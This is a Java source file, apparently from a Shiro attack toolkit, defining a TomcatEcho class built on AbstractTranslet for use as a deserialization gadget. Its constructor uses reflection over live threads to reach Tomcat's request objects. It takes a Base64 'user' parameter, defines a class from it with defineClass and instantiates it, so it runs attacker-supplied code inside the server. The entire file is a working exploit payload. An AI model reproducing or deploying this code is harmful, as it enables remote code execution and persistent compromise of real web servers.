package com.govuln.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.shiro.codec.Base64;

import java.lang.reflect.Field;
import java.util.List;

public class TomcatEcho extends AbstractTranslet {
    protected String[] namesArray = new String[]{"1"};

    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public TomcatEcho(){
        try {
            String var3 = null;
            boolean var5 = false;
            Thread[] var6 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");

            for(int var7 = 0; var7 < var6.length; ++var7) {
                Thread var8 = var6[var7];
                if (var8 != null) {
                    String var2 = var8.getName();
                    if (!var2.contains("exec") && var2.contains("http")) {
                        Object var1 = getFV(var8, "target");
                        if (var1 instanceof Runnable) {
                            try {
                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                            } catch (Exception var20) {
                                continue;
                            }

                            List var10 = (List)getFV(var1, "processors");

                            for(int var11 = 0; var11 < var10.size(); ++var11) {
                                Object var12 = var10.get(var11);
                                var1 = getFV(var12, "req");
                                Object var13 = var1.getClass().getMethod("getNote", Integer.TYPE).invoke(var1, new Integer(1));
                                var3 = (String)var13.getClass().getMethod("getParameter", String.class).invoke(var13, new String("user"));


                                if (var3 != null && !var3.isEmpty()) {
                                    byte[] classBytes = Base64.decode(var3);
                                    java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                                    defineClassMethod.setAccessible(true);
                                    Class invoke = (Class)defineClassMethod.invoke(TomcatEcho.class.getClassLoader(), classBytes, 0, classBytes.length);
                                    invoke.newInstance().equals(var13);
                                    var5 = true;
                                }

                                if (var5) {
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception var21) {
        }



    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }


}
